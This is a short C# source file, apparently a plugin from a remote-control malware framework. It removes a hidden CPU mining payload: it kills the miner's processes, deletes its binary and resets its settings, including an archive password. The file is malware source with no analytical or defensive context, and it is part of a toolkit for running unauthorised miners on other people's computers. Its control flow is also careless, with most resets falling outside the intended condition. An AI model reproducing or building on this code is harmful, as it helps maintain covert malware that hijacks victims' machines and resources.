using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
namespace Plugin
{
    class Cpu_Del
    {
        public static void Get(string cpuBin, string cpuProc, string cpuWorkDir, string cpuZipPass, string cpu_idParameters, string cpuParametrs, string cpuDelay)
        {
            try
            {
                if (File.Exists(cpuBin))
                    foreach (Process p in Process.GetProcessesByName(cpuProc))
                    {
                        p.Kill();
                        Thread.Sleep(2000);
                    }

                if (File.Exists(cpuBin))
                    File.Delete(cpuBin);
                if (!File.Exists(cpuBin))
                    cpuParametrs = "1"; // Launch parameters
                cpuProc = "1"; // In the archive
                cpuWorkDir = "1";
                cpuZipPass = "1";
                cpuDelay = "1";
                cpuBin = "1";
                cpu_idParameters = "0";

            }
            catch (Exception ex)
            {
                Packet.Error(ex.Message);
                return;
            }
        }
    }
}
